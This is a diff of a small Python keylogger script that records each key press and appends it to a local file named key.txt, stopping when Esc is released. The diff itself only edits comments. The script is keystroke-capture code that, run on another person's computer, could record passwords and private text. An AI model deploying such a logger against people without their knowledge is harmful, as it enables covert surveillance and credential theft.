@@ -13,12 +13,12 @@ def keypress(key):
     count += 1
     print("{0} pressed".format(key))
 
-    if count >=1: # every character is written to file as soon as it is pressed so count greater than equal to 1
+    if count >=1: #every character is written to file as soon as it is pressed so count greater than equal to 1
         count = 0
         write_to_file(keys)
         keys = []
 
-# function to write to file
+#function to write to file
 def write_to_file(keys):
     with open("key.txt", "a") as f: #for the 1st time if you don't want to create a file then use 'w' in place of 'a' but from next time you will need to use 'a' to append to the text file
         for key in keys:
@@ -30,7 +30,7 @@ def write_to_file(keys):
             elif k.find("Key") == -1: # whenever the character pressed doesn't have word 'Key' which is there when shift ,ctrl etc is pressed, the character is written to file
                 f.write(k)
 
-# function to stop the program is to press esc key
+#function to stop the program(just press esc key)
 def keyrelease(key):
     if key == Key.esc:
         return False
